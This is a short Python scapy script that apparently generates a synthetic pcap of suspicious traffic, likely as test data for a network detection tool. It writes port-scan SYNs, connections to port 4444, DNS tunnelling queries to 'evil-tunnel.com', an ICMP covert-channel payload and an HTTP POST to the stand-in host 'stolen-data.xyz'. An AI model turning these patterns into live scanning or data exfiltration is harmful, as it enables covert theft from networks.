from scapy.all import *
import random

packets = []

# Port scan: src 10.0.0.100 hitting many ports
for port in range(1, 200):
    pkt = IP(src="10.0.0.100", dst="192.168.1.1") / TCP(sport=54321, dport=port, flags="S")
    packets.append(pkt)

# Metasploit default port (4444)
for _ in range(5):
    pkt = IP(src="10.0.0.100", dst="203.0.113.10") / TCP(sport=54321, dport=4444, flags="S")
    packets.append(pkt)

# DNS tunnel: long high-entropy subdomain
import base64, os
for _ in range(10):
    encoded = base64.b64encode(os.urandom(40)).decode().replace("=","").replace("+","x").replace("/","y")
    pkt = IP(src="10.0.0.100", dst="8.8.8.8") / UDP(dport=53) / DNS(
        rd=1, qd=DNSQR(qname=f"{encoded}.evil-tunnel.com")
    )
    packets.append(pkt)

# ICMP with payload (covert channel)
for _ in range(5):
    payload = b"hidden data " * 10
    pkt = IP(src="10.0.0.100", dst="203.0.113.10") / ICMP() / Raw(load=payload)
    packets.append(pkt)

# HTTP POST to Suspicious TLD
malicious_tld_ip = "198.51.100.22"
http_payload = b"POST /upload HTTP/1.1\r\nHost: stolen-data.xyz\r\nContent-Length: 100\r\n\r\n" + (b"A" * 100)
pkt = IP(src="10.0.0.100", dst=malicious_tld_ip) / TCP(sport=50000, dport=80, flags="PA") / Raw(load=http_payload)
packets.append(pkt)

wrpcap("malicious_traffic.pcap", packets)
print(f"Generated malicious_traffic.pcap with {len(packets)} packets")
